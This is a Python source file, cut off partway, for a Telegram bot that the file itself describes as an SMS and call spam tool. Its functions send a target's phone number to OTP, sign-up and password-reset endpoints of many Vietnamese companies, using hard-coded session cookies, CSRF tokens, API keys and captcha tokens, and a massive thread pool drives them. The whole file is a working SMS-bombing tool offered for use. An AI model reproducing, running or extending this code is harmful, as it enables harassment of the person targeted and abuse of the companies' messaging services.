# bot.py - Telegram Bot spam SMS/CALL - Public version
# Yêu cầu: Python 3.9+, thư viện: python-telegram-bot==20.7, requests, pystyle, bs4

import os
import re
import time
import random
import string
import json
import requests
from bs4 import BeautifulSoup
from concurrent.futures import ThreadPoolExecutor
from pystyle import Col, Colors
import urllib3
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, CallbackQueryHandler, ContextTypes, MessageHandler, filters
from dotenv import load_dotenv

# Tắt cảnh báo SSL
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
load_dotenv()

# === CẤU HÌNH BOT ===
TOKEN = os.getenv("BOT_TOKEN", "YOUR_BOT_TOKEN_HERE")
MAX_THREADS = 10000000
threading = ThreadPoolExecutor(max_workers=MAX_THREADS)

# Biến toàn cục
thanhcong = 0
thatbai = 0
phone_target = ""
running = False
user_sessions = {}  # Lưu trạng thái theo user_id

# === HÀM TIỆN ÍCH ===
def generate_random_string(length):
    letters_and_digits = string.ascii_letters + string.digits
    return ''.join(random.choice(letters_and_digits) for _ in range(length))

def Random_string(length, minh=None):
    if minh is None:
        minh = string.ascii_lowercase
    return ''.join(random.choices(minh, k=length))

def random_string(length):
    return ''.join(random.choice(string.ascii_lowercase) for _ in range(length))

# === HÀM SPAM SMS (GIỮ NGUYÊN) ===
def sms0(phone):
    global thanhcong
    cookies = {'csrftoken': 'jxZ3X9GCAyb74yxGzBAEtd8Ke1TAXESU9qpypmmi6jAkrNC2lOo3vepbv5q29aU7', 'tel': phone}
    headers = {'Host': 'kavaycash.com', 'User-Agent': 'Mozilla/5.0 (Linux; Android 9; SM-G973N) AppleWebKit/537.36', 'Accept': 'text/html', 'X-Requested-With': 'mark.via.gp', 'Referer': 'https://kavaycash.com/'}
    try:
        requests.get('https://kavaycash.com/verification/', cookies=cookies, headers=headers, timeout=10)
        thanhcong += 1
    except:
        pass

def sms1(phone):
    global thanhcong, thatbai
    headers = {'authority': 'api.vayvnd.vn', 'content-type': 'application/json; charset=utf-8', 'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'}
    json_data = {'login': phone, 'trackingId': 'h9vBHoAE9KcJ7xX6GF8sfN7hHxryAIwl28zt6ycjTI8JhfdLlE1fHyGTqQmw8AMN'}
    try:
        response = requests.post('https://api.vayvnd.vn/v2/users/password-reset', headers=headers, json=json_data, timeout=10)
        if "true" in response.text:
            thanhcong += 1
        else:
            thatbai += 1
    except:
        thatbai += 1

def sms2(phone):
    global thanhcong, thatbai
    headers = {'Host': 'fptshop.com.vn', 'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8', 'X-Requested-With': 'XMLHttpRequest', 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'}
    data = {'phone': phone, 'typeReset': '0'}
    try:
        response = requests.post('https://fptshop.com.vn/api-data/loyalty/Login/Verification', headers=headers, data=data, timeout=10)
        if '"error":false,' in response.text:
            thanhcong += 1
        else:
            thatbai += 1
    except:
        thatbai += 1

def sms3(phone):
    global thanhcong
    headers = {'authority': 'kingme.pro', 'content-type': 'application/x-www-form-urlencoded; charset=UTF-8', 'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36', 'x-requested-with': 'XMLHttpRequest'}
    data = {'phoneNumber': phone}
    try:
        requests.post('https://kingme.pro/vi/Otp/SendOtpVerifyPhoneNumber', headers=headers, data=data, timeout=10)
        thanhcong += 1
    except:
        pass

def sms4(phone):
    global thanhcong
    headers = {'Host': 'vietteltelecom.vn', 'X-CSRF-TOKEN': 'mXy4RvYExDOIR62HlNUuGjVUhnpKgMA57LhtHQ5I', 'Content-Type': 'application/json;charset=UTF-8', 'User-Agent': 'Mozilla/5.0 (Linux; Android 10; RMX3063) AppleWebKit/537.36'}
    data = {'phone': phone, 'type': ''}
    try:
        requests.post('https://vietteltelecom.vn/api/get-otp-login', json=data, headers=headers, timeout=10)
        thanhcong += 1
    except:
        pass

def sms5(phone):
    global thanhcong
    try:
        response = requests.get('https://viettel.vn/dang-ky', timeout=10)
        token = response.text.split('name="csrf-token" content="')[1].split('"')[0]
        headers = {'Host': 'viettel.vn', 'X-XSRF-TOKEN': token, 'X-CSRF-TOKEN': token, 'X-Requested-With': 'XMLHttpRequest', 'Content-Type': 'application/json;charset=UTF-8', 'User-Agent': 'Mozilla/5.0 (Linux; Android 12; SM-A217F) AppleWebKit/537.36'}
        data = {'msisdn': phone}
        requests.post('https://viettel.vn/api/get-otp', json=data, headers=headers, timeout=10)
        thanhcong += 1
    except:
        pass

def sms7(phone):
    global thanhcong, thatbai
    cookies = {'laravel_session': '5FuyAsDCWgyuyu9vDq50Pb7GgEyWUdzg47NtEbQF', 'XSRF-TOKEN': 'eyJpdiI6IkQ4REdsTHI2YmNCK1QwdTJqWXRsUFE9PSIsInZhbHVlIjoiQ1VGdmZTZEJvajBqZWFPVWVLaGFabDF1cWtSMjhVNGJMNSszbDhnQ1k1RTZMdkRcL29iVzZUeDVyNklFRGFRRlAiLCJtYWMiOiIxYmI0MzNlYjE2NWU0NDE1NDUwMDA3MTE1ZjI2ODAxYjgzMjg1NDFhMzA0ODhiMmU1YjQ1ZjQxNWU3ZDM1Y2Y5In0%3D'}
    headers = {'Host': 'viettel.vn', 'Content-Type': 'application/json;charset=UTF-8', 'X-CSRF-TOKEN': '2n3Pu6sXr6yg5oNaUQ5vYHMuWknKR8onc4CeAJ1i', 'X-Requested-With': 'XMLHttpRequest', 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'}
    json_data = {'phone': phone, 'type': ''}
    try:
        response = requests.post('https://viettel.vn/api/get-otp-login', cookies=cookies, headers=headers, json=json_data, timeout=10)
        if '200' in response.text:
            thanhcong += 1
        else:
            thatbai += 1
    except:
        thatbai += 1

def sms8(phone):
    global thanhcong, thatbai
    headers = {'authority': 'products.popsww.com', 'api-key': '5d2300c2c69d24a09cf5b09b', 'content-type': 'application/json', 'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'}
    json_data = {'fullName': '', 'account': phone, 'password': 'xX.j2!h5gAv', 'confirmPassword': 'xX.j2!h5gAv', 'recaptcha': '03AFcWeA7k7xTO-mWbrjVz2PZ9x-n9aq6g1xwVO4rLyuQdURsV9tGIC8J3GO2KbrsA0-Sm9xcvRH5VmR75FY-2FDO2GV3Iy_ZIIH8F-8RdvFMl2Um9qdr9Zsyrf7zDrw6QCA7yDSo0lHfSO_Ja1hcoHodAjUIIXI52Gqfr9nJGotdUiNuobzxW1ADC4_1y9zRUdCNZVobRZfR_eE-ZA2r_PbXoWLhp5KzeLWWXIT6Al15ZdSeC5AfGzs1pVYO9a2ZuW3x4vFYU_Z7Jfl784gjS8EMAQpCZSHcxx9c6dvTZNRliFjymEWyD6ps09g9wFg1SoYjRrSjqMOlZijxS04RQ5UalO4DW1JVF4jYq5OMX0GXD-R6-S1_M9KBTN46B4HYnww_PPv5cauuWtBNwoWik8IInjUr_TdqIH2h__vXukXMt-fs7LJll_rHKQVtjJT3IQBWHbPOTSfAk7ehHFg5Zi7TgHaJsrdjej4T8fN53cqXV9Mu9utFNpOK7Fdrk9_iaUWPewcZ3QukyzVRCD--v5rnw58hM493AamrQsYbqrcOL6fOK-8nO6Ps2M7k-nfLOdN9vYyYpl4w1xvQfjw3oJ2UUwy4ANKHPTM2_B4FyVru8fhyGdwM367t2E3mliLsz2A0HzKzGBk3A51f8KY_c0CDjMbRitcMFHsdQkjuRgGi69tfQ_nPaWAU5ox7nvjeDzBBW6ojQMz2iHciPtsKISt5_pkDJ5BW9W38GqAvUqz48JQPuXa6LQwfaFWvfN5nCTu4ru4mLyjqR_th7DS2A3USqmIMAbMDtXL2oyCMk_OBmQoQv9T2_cqBWCemjTmKOCdAeBK18MNW2ugpnIN0lDUtxqFUVRYKRWiQIv75QQXoe8xO4uXxBb8Ee95pCQIeaRWL2G5lvj5z1P4jiKUJ_8EK5yFYp1y_utA8NIJ6sZNyxA8BW2X1NcqJM4NaDDhDP4MaAHFqNbmlX7rQvJjLJd_PviL855FMVuF6lFGAY2l3p8SLrGYnqH4RWg1bMU_Hu1cLdmLSD6eA4BsrkIXpTyXGQLL97GBoYgARVdvgofYSz7pVwicRPUXfkMzLo4TF-HFsAcI91-RFB3ZTKXJUsKEbmIA_BRBY4oWAYCsnFVW_cTGCaaRpECLOF06bAjjoDokEizIEXKO1rDgbl-30kjfM29Yp9QY8FC_NaUEcRQvGF4JB6bAhEU3mL3lvu1Y5AcvtCJyKHcf5due0hnZun1vAaHoY5OscicczZIRl2ldGrwpy1PmlEbkQuU9aAYwebMF9X6vaVPZmf8qYRB467_r31Y4maNgVET7I520vabSTd0S3BQ5cAiB4JhMoKUO5Ky_OtVlHezMdx20CVXxtDXFf4gHpQYRkOCwxcNvvZQZrtcI52wDXCc_oK3ze9zVCrD0249gMiy9YapELDGBSQ6IEd42WJdZWON1kDK5Gj9FM0RVkhnwovPHUUo3iwBzZMfAYivDvnkIA9dKyR8fJ55tWcUmL5INvpAxu2WQE5DIIYDwVa2UTd4k1XI-vgiV_zSsY7hMcCPhHDsyDGyz2avKG5QhFgzxp8Womf715LS8ZopD4M0GNnUptiRxKb3VQt1wkhfGtCjXYolZX8YJ12X4y3abYOf65A4w'}
    try:
        response = requests.post('https://products.popsww.com/api/v5/auths/register', headers=headers, json=json_data, timeout=10)
        if '"status":"PENDING"' in response.text:
            thanhcong += 1
        else:
            thatbai += 1
    except:
        thatbai += 1

def sms9(phone):
    global thanhcong, thatbai
    headers = {'Host': 'fptshop.com.vn', 'content-type': 'application/x-www-form-urlencoded; charset=UTF-8', 'x-requested-with': 'XMLHttpRequest', 'user-agent': 'Mozilla/5.0 (Linux; Android 8.1.0; CPH1805) AppleWebKit/537.36'}
    try:
        response = requests.post('https://fptshop.com.vn/api-data/loyalty/Home/Verification', headers=headers, data={'phone': phone}, timeout=10)
        if response.status_code == 200:
            thanhcong += 1
        else:
            thatbai += 1
    except:
        thatbai += 1

def sms10(phone):
    global thanhcong, thatbai
    headers = {'Host': 'api.vieon.vn', 'content-type': 'application/x-www-form-urlencoded', 'authorization': 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJleHAiOjE2ODE5MTU2NjYsImp0aSI6ImY1ZGI4MDJmNTZjMjY2OTg0OWYxMjY0YTY5NjkyMzU5IiwiYXVkIjoiIiwiaWF0IjoxNjc5MzIzNjY2LCJpc3MiOiJWaWVPbiIsIm5iZiI6MTY3OTMyMzY2NSwic3ViIjoiYW5vbnltb3VzXzdjNzc1Y2QxY2Q0OWEzMWMzODkzY2ExZTA5YWJiZGUzLTdhMTIwZTlmYWMyNWQ4NTQ1YTNjMGFlM2M0NjU3MjQzLTE2NzkzMjM2NjYiLCJzY29wZSI6ImNtOnJlYWQgY2FzOnJlYWQgY2FzOndyaXRlIGJpbGxpbmc6cmVhZCIsImRpIjoiN2M3NzVjZDFjZDQ5YTMxYzM4OTNjYTFlMDlhYmJkZTMtN2ExMjBlOWZhYzI1ZDg1NDVhM2MwYWUzYzQ2NTcyNDMtMTY3OTMyMzY2NiIsInVhIjoiTW96aWxsYS81LjAgKExpbnV4OyBBbmRyb2lkIDEwOyBSTVgxOTE5KSBBcHBsZVdlYktpdC81MzcuMzYgKEtIVE1MLCBsaWtlIEdlY2tvKSBDaHJvbWUvMTEwLjAuMC4wIE1vYmlsZSBTYWZhcmkvNTM3LjM2IiwiZHQiOiJtb2JpbGVfd2ViIiwibXRoIjoiYW5vbnltb3VzX2xvZ2luIiwibWQiOiJBbmRyb2lkIDEwIiwiaXNwcmUiOjAsInZlcnNpb24iOiIifQ.aQj5VdubC7B-CLdMdE-C9OjQ1RBCW-VuD38jqwd7re4', 'user-agent': 'Mozilla/5.0 (Linux; Linux x86_64; en-US) AppleWebKit/535.30'}
    params = {'platform': 'mobile_web', 'ui': '012021'}
    payload = {'phone_number': phone, 'password': 'Vexx007', 'given_name': '', 'device_id': '7c775cd1cd49a31c3893ca1e09abbde3', 'platform': 'mobile_web', 'model': 'Android%2010', 'push_token': '', 'device_name': 'Chrome%2F110', 'device_type': 'desktop', 'ui': '012021'}
    try:
        response = requests.post('https://api.vieon.vn/backend/user/register/mobile', params=params, data=payload, headers=headers, timeout=10)
        if response.status_code == 200:
            thanhcong += 1
        else:
            thatbai += 1
    except:
        thatbai += 1

def sms11(phone):
    global thanhcong, thatbai
    cookies = {'PHPSESSID': 'j7jhajmp8628ho9d98bckrhkog'}
    headers = {'Host': 'concung.com', 'content-type': 'application/x-www-form-urlencoded; charset=UTF-8', 'x-requested-with': 'XMLHttpRequest', 'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'}
    data = {'ajax': '1', 'classAjax': 'AjaxLogin', 'methodAjax': 'sendOtpLogin', 'customer_phone': phone, 'statictoken': 'e633865a31fa27f35b8499e1a75b0a76', 'captcha_key': '9a1b5162bfa438e4ead921afe49cc8d3', 'id_customer': '0'}
    try:
        response = requests.post('https://concung.com/ajax.html?sendOtpLogin', cookies=cookies, headers=headers, data=data, timeout=10)
        if response.status_code == 200:
            thanhcong += 1
        else:
            thatbai += 1
    except:
        thatbai += 1

def sms12(phone):
    global thanhcong
    headers = {'Host': 'topenland.com', 'user-agent': 'Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36'}
    params = {'phoneNumber': phone}
    try:
        requests.get('https://topenland.com/_next/data/VL6b140TPQ9AMHJ2DqgBU/vi/sign-up/verify-otp.json', params=params, headers=headers, timeout=10)
        thanhcong += 1
    except:
        pass

def sms13(phone):
    global thanhcong, thatbai
    headers = {'Host': 'api-gateway.pharmacity.vn', 'content-type': 'application/json', 'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'}
    json_data = {'phone': phone, 'referral': ''}
    try:
        response = requests.post('https://api-gateway.pharmacity.vn/customers/register/otp', headers=headers, json=json_data, timeout=10)
        if 'success' in response.text:
            thanhcong += 1
        else:
            thatbai += 1
    except:
        thatbai += 1

def sms14(phone):
    global thanhcong, thatbai
    headers = {'Host': 'apivideo.mocha.com.vn', 'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'}
    params = {'msisdn': phone, 'languageCode': 'vi'}
    try:
        response = requests.post('https://apivideo.mocha.com.vn/onMediaBackendBiz/mochavideo/getOtp', params=params, headers=headers, timeout=10)
        if '200' in response.text:
            thanhcong += 1
        else:
            thatbai += 1
    except:
        thatbai += 1

def sms15(phone):
    global thanhcong, thatbai
    headers = {'Host': 'v9-cc.800best.com', 'content-type': 'application/json', 'user-agent': 'Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36', 'x-auth-type': 'WEB', 'x-lan': 'VI'}
    json_data = {'phoneNumber': phone, 'verificationCodeType': 1}
    try:
        response = requests.post('https://v9-cc.800best.com/uc/account/sendsignupcode', headers=headers, json=json_data, timeout=10)
        if '"status":true' in response.text:
            thanhcong += 1
        else:
            thatbai += 1
    except:
        thatbai += 1

def sms17(phone):
    global thanhcong, thatbai
    headers = {'Host': 'v3.meeyid.com', 'content-type': 'application/json', 'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36', 'x-client-id': 'meeyid', 'x-time': '1703859585701', 'x-token': 'MHgmvk9zRhqTcwMzg1OTU4NTcwMLJAC3S5jaUtJeFVNbklFQ2dsaHJwR0RvRGpqb055cG9sWEtzeEpWU23fN9RxHZkd5QlRORERiVXV3ekx3ZAmz1br1bbVMDvwcElNRGVEdEhES2Z4WU5wLjQyMDI0ZmYzYzJkZDcwZWEzYTQ5ODM3YjRkOWU1MjA3'}
    json_data = {'phone': phone, 'phoneCode': '+84', 'refCode': ''}
    try:
        response = requests.post('https://v3.meeyid.com/auth/v4.1/register-with-phone', headers=headers, json=json_data, timeout=10)
        if '"status":true' in response.text:
            thanhcong += 1
        else:
            thatbai += 1
    except:
        thatbai += 1

def sms18(phone):
    global thanhcong, thatbai
    headers = {'Host': 'api.onelife.vn', 'content-type': 'application/json', 'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36', 'domain': 'kingfoodmart'}
    json_data = {'operationName': 'SendOTP', 'variables': {'phone': phone}, 'query': 'mutation SendOTP($phone: String!) {\n  sendOtp(input: {phone: $phone, captchaSignature: "", email: ""}) {\n    otpTrackingId\n    __typename\n  }\n}'}
    try:
        response = requests.post('https://api.onelife.vn/v1/gateway/', headers=headers, json=json_data, timeout=10)
        if 'INVALID' in response.text:
            thatbai += 1
        else:
            thanhcong += 1
    except:
        thatbai += 1

def sms19(phone):
    global thanhcong
    cookies = {'_gcl_aw': 'GCL.1703860145.CjwKCAiA-bmsBhAGEiwAoaQNmkA-crCLTrKUuF6c3jMX4pjr7v9SV9QZLh7wfxFdSLMSssNdkdr4QxoC3lUQAvD_BwE'}
    headers = {'Host': 'api.popeyes.vn', 'content-type': 'application/json', 'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36', 'ppy': 'ULWQDN', 'x-client': 'WebApp'}
    json_data = {'phone': phone, 'firstName': 'tuoi', 'lastName': 'la', 'email': 'latuoi@gmail.com', 'password': 'cocailon'}
    try:
        requests.post('https://api.popeyes.vn/api/v1/register', cookies=cookies, headers=headers, json=json_data, timeout=10)
        thanhcong += 1
    except:
        pass

def sms20(phone):
    global thanhcong
    headers = {'Host': 'api.alfrescos.com.vn', 'content-type': 'application/json', 'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36', 'BrandCode': 'ALFRESCOS', 'DeviceCode': 'web'}
    params = {'culture': 'vi-VN'}
    json_data = {'phoneNumber': phone, 'secureHash': '753d977024f8d805306e5078ad25a00a', 'deviceId': '', 'sendTime': 1703860383205, 'type': 1}
    try:
        requests.post('https://api.alfrescos.com.vn/api/v1/User/SendSms', params=params, headers=headers, json=json_data, timeout=10)
        thanhcong += 1
    except:
        pass

def sms21(phone):
    global thanhcong
    try:
        requests.post("http://m.tv360.vn/public/v1/auth/get-otp-login", headers={"Host": "m.tv360.vn", "User-Agent": "Mozilla/5.0 (Linux; Android 10; moto e(7i) power) AppleWebKit/537.36", "Content-Type": "application/json"}, json={"msisdn": "0" + phone[1:11]}, timeout=10)
        thanhcong += 1
    except:
        pass

def sms22(phone):
    global thanhcong
    headers = {'Host': 'api.fptplay.net', 'content-type': 'application/json; charset=UTF-8', 'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36', 'x-did': 'ABF6AD8B2ACE7D0E'}
    json_data = {'phone': phone, 'country_code': 'VN', 'client_id': 'vKyPNd1iWHodQVknxcvZoWz74295wnk8'}
    try:
        requests.post('https://api.fptplay.net/api/v7.1_w/user/otp/register_otp?st=CUZ-KiJXaLMJ7FszwK_Zrw&e=1703864126&device=Chrome(version%253A120.0.0.0)&drm=1', headers=headers, json=json_data, timeout=10)
        thanhcong += 1
    except:
        pass

def sms23(phone):
    global thanhcong
    headers = {'Host': 'api.ahamove.com', 'content-type': 'application/json;charset=UTF-8', 'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'}
    json_data = {'mobile': phone[1:9], 'name': 'hoang', 'email': 'bohoangdz@gmail.com', 'country_code': 'VN', 'firebase_sms_auth': 'true', 'time': 1703860692, 'checksum': 'H5orYHI463TcARZHf6xyU/lyv4+lx3w68FS1zNXx0Cx9gaj2npSXuh2aKSCVfR44cTSPPumj1ECww4Rlvn7hcEYP4RtrY8JZicv4ZPpWnxxyvS3NOuyPxOo64PatsAf8+dnEn09D0llQoq8FlD6tQfZ06bn9b5Ug1ZRakqndxdA4D4Y03bcXeraizM7P5EHkNzMebCIjOxANDSh8ODEqLBhmgKrkKSZT2Nl3ObWPQuhY0dO5xp7zW4zaBNbkD+JlvyewhsD9mN4pPxoambo2LfpXwDQthi04i/UKqEy+QtoM0bVkYypsUA1QiFvt+tKSSPf2C1qCJv5xJqUYehjiUg=='}
    try:
        requests.post('https://api.ahamove.com/api/v3/public/user/register', headers=headers, json=json_data, timeout=10)
        thanhcong += 1
    except:
        pass

def sms24(phone):
    global thanhcong
    cookies = {'laravel_session': '7FpvkrZLiG7g6Ine7Pyrn2Dx7QPFFWGtDoTvToW2', 'XSRF-TOKEN': 'eyJpdiI6InlxYUZyMGltTnpoUDJSTWVZZjVDeVE9PSIsInZhbHVlIjoiTkRIS2pZSXkxYkpaczZQZjNjN29xRU5QYkhTZk1naHpCVEFwT3ZYTDMxTU5Panl4MUc4bGEzeTM2SVpJOTNUZyIsIm1hYyI6IjJmNzhhODdkMzJmN2ZlNDAxOThmOTZmNDFhYzc4YTBlYmRlZTExNWYwNmNjMDE5ZDZkNmMyOWIwMWY5OTg1MzIifQ%3D%3D'}
    headers = {'Host': 'viettel.vn', 'Content-Type': 'application/json;charset=UTF-8', 'X-CSRF-TOKEN': 'HXW7C6QsV9YPSdPdRDLYsf8WGvprHEwHxMBStnBK', 'X-Requested-With': 'XMLHttpRequest', 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'}
    json_data = {'msisdn': phone}
    try:
        requests.post('https://viettel.vn/api/get-otp', cookies=cookies, headers=headers, json=json_data, timeout=10)
        thanhcong += 1
    except:
        pass

def sms25(phone):
    global thanhcong
    headers = {'Host': 'www.kidsplaza.vn', 'content-type': 'application/json', 'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36', 'x-requested-with': 'XMLHttpRequest'}
    json_data = {'data': {'password': 'Qưert1234', 'confirm_password': 'Qưert1234', 'phone': phone, 'email': 'caobaquat@gmail.com', 'name': 'cao qua quat', 'website_id': '2', 'g_recaptcha_response': '03AFcWeA75cAjgxMNMOL5LbmcYAhxTdK2QLb3HgQ96S8MbpbVFLlCj5-U4AGBKZBg3PEyDyCw1gp1wmsGpeiEVKZ3wmLAkySQAhE_v-on0nHF1-ypoucOAVp9QS8X7J9EFxUuo2bQ1Iysa7OgVxzQ9jRz4JZ3SLHtjmjjl0UoYYrBFBamdaUvCZrRNw9HjuIyPQJrxXuCsL4Bw0FpqSaRAHrsF4aP4mMV7azfBII4n6foFEjbV5v9hyYtRkwj_vvwIBV2PpI9rtcI1zy2e0cnlONPVCO3pSIdBpnU6b1Q45RiCU8PZ5YHxQNzYQDNhdOW8SDKBV7PBjB_rk4puJ-EjuAa8xih2TfGpXkIxPV_B4MXshMiUYOGK6kAW1jtC06Ai49Sv2xAbyl_sJZ9kyPYCLmPUigyUhZfDTk6wzf1FTxbi9IwZ5Y69zkkIdI3E6cGK-QYPKl8NY9EQhgtKRSp-VcdGLIpanU1EmTeeuXn_q1EK-fxvN4rTJtGgwo4--UP2_kA2lk3Cygn3uFIZNnB_7YtlaeMvA-QQWJdjXM7R9frcK3KdxbIhkCKxw8xCMSYbc9wbIw-6vbUuUVoMM7vQNkmRb-Klu5tewPi9uOItwDiYmXQLBjW7ucTjvv63sZ_ZPYtAVmOc4iNMvJ3mi2k1XO7zYmZp7pNm2b47vzUIh-fmpOjDarghErGglilfy1U5grW_HV1scyhp5lWrSLhyQ9a_n3cxBCkqoRCeFv3rdco7KotOV1u1BfON_xHLeAGrbgpOybT62N0hjcFS8RElTEf8pddtQ-jz0EqfuP5N1kOi-6g4lY9bggZJ09bbJkdGXb1VmVLrlOAOTCgqW_0cAA7HqOXjpM3Nqtp9sp8IifvCpp_1nKHaACNyJca4Nla-ftROHVnHxLxq656pZws_7tEBBZzhkCuC_8x7Q_tJ_vfNLPDY13TY-Ep-jd9YM-hYxU-RnBidA8BJ4FvJjEVBLH9i7TKKO-quVZWIVRSY8o5xbymism17BCtpfZztjfC8q2_S2D5_EPWgkojMlfBkeeg3rlTnioP4NeGA1DE9cV-GP9_vpDcVGz1dg7wMbSKt59vw4yKnJX75fypBTAVgVrVyrvWRYF9fNBalVWQ6wu7ie_XpaCiOXVAys6UPl6lYsiJadvDJerYmRF58IJKSASUnunNZxN5zg-NGZvfu_ozzvRhrdlcvhc3Lm5xfN-uVT-GQfC0lg7yc30IOAMMVvjEGKA-XcJaGxq3Uw4ITikUSQRmr1u_PgoTV6qdxnYFaB9xV_sGMVT6z8P2SrSaUM4VWOL-SBZCbk7Mf2HOZYjxhglDwDJBt2DV2dgYNR-ApXpsNCjZwqnAzDGGH56XIX6Y7kk75C-C9aIHdErlX1ee3t6Pif8ZRcitngOrXMz_duyNPFKLVY78ZmBslhJJXJ_ywhh-P4tqxrDDlhYK1m_bwMwo4iWTYK2J92yTaX6c0cxg-TBYE0eAYZiscCvmxBf7egqpp6dMnFiS7f9JqFa8_lrG6gaFlaSrU9Q5hR77GbD9LO6eRLM68k1EE4APjUs9faxlhQ4z1rmB9b66HMab9Ug_dllDWSM9TUKTQOuJj4qoLmmD2bZAJ'}}
    try:
        requests.post('https://www.kidsplaza.vn/rest/hcm/V1/customer/account/register/on-web', headers=headers, json=json_data, timeout=10)
        thanhcong += 1
    except:
        pass

def sms26(phone):
    global thanhcong
    cookies = {'_ga': 'GA1.1.1751329135.1703861100', '_fbp': 'fb.1.1703861102777.176529727'}
    headers = {'Host': 'id.icankid.vn', 'content-type': 'application/json', 'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'}
    json_data = {'phone': phone, 'challenge_code': '5b9005fe63325e396605b903a880358e7918d9f62c42dfb5c707116318164dfd', 'challenge_method': 'SHA256', 'recaptcha_response': '03AFcWeA4KZqSQejuSnmkm5NLHnv2jrAlew4hLmnOMiDH7mZ20TfbdLgvb_iFXbQm9i8qccALnN2RayQRVgWM_EJlfStQ4-r6SEBkVOkBHRMiJjNJsa4ghuX8I48UKvE9r1BiEJ3_BBgRuBKN_s-X7vFt231Gis2cK9lbjOzt0x2MHWcEAfP6ixjN3-5fPL9ogloWRillgHqIgRk2F761fzfwgOH0ymjm0umHxZaRULHoegWjdoB3vXllk1DYhYo-y4xSxn7tq_e9OwVC2xIGjLtO5vR94BioeIrsr368CkZItqFTFmGKqcI12Dkr558aeR1CWoCt6ihiDDR8eoN1o68A4TOFA_TVu0VrCmmME-MrE1QI5ItocnoJaxcO5RKFFsIu1QYqtpX-N3cHQuP6P9phnMNmyVY8H5H_xSiTnceAA0CUlsAn9eubQHIlUPY_ok_IXLmAZ-iFOVMVv3AvRErpnHHAoLsdLyGRhysIk7ZNtpMh57e5tlTHezJr7CPpO7rchUDdM2mEnBD-bJPyMNtNyxe3LieCMvG32okTXvGjLbA6wcLiCIzwT6c5RtHFMqvq_FYfSTvOiKQITguDNWw3xR9SQT2RcJwbZh4JehwoYmakYj190l8EJ-_PiiknxDi2LhSp1FhRCObX0js7Sl-vfaHVrXRgPOF38gc_RRRfLBnT8g7jszvM8DdKfwY10l5lxaBW18j1hSWwpnZDDRlyKhn_TOqusm2e-XQbE-a1V26Ft3_QJfzL4Y9Eo2PQgrW7LKuPYCot9lWiX6QexWV5GNL4rNWt6mXQMJFCgoAlfmyrQey5tbv44eeFZOzWOZWy2OLedVy5bLwMh5TqOFowZ3yTPIt0NWVb005ElpX5NGKyLjSRKUlXSiuNTWSW6bNYPyZr3FcVpA5ONSrc0F4Ctl7HydtGF2KmULQVI8UWp73IqVL8E5HJGuKToPzRkZjNRXlvRerXacSb2bLiXioMR6KG6rtNpoRbgPu1GjH8v79BRXNFb9SZu1ADx0Sy-u00_CjeYuRj5gp32PprtOcj8BuMKaHdd9K2cAh9aXOvleES73qk3UlOodXrJa6apbj6PFpUtYE5qE3NaAENYz1rp6-NQ89FHR7KJ3OSnLZqcASGp7ba0gt-nsNXyr7qR-Dieg2alljtOzSYfF0F3_c2UMSnMjWTu65pKyPzLmBDr0KFIGvbrqd_kcdfpDdQIL2-4uCkZ_9DDomACMTIYtq9kCVh_XWW8iPEkMuwCDHACBFA7VO5SPMYYb7uMoqj90lQ0fTFI364lvYzvHXKlaU97Zng-XOJRS-dGlSyu0ceDi5iZqd1BiivlIConTRvFPvDEVvEDK2IILpeS8zx9LFInmTainw8CmU65quBQkM7bir8UG7hvL4-Aa940kxuiTB1SbAkVl_4y0LPoMZ_DHMGNp9CS_jDNr5IatcFICb-g67g_U2J1uJC44SigbOjuMIQSMqZjTk1iIa4vzCKThBeb-3ncif1We_ASXy8xuTQUc_w_zpp-bzL2F-jYi86omdge49GNQbr28gM6Sq57sSjjH6GJ0YyVVygaWO8mi9gkhyYmriG_xZiHJRK3Eco-Z3SBNHewpWCp'}
    try:
        requests.post('https://id.icankid.vn/api/otp/challenge/', cookies=cookies, headers=headers, json=json_data, timeout=10)
        thanhcong += 1
    except:
        pass

def sms27(phone):
    global thanhcong
    cookies = {'XSRF-TOKEN': 'ogjtKPLiRqRYXapEbaRp479KQzXMMNTGEDVcaBG1', 'laravel_session': 'NPhgjHtQLS9zTjkcXagKiBHeH1NggSzio48tN1mz'}
    headers = {'Host': 'thitruongsi.com', 'content-type': 'application/json', 'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36', 'x-requested-with': 'XMLHttpRequest', 'x-xsrf-token': 'ogjtKPLiRqRYXapEbaRp479KQzXMMNTGEDVcaBG1'}
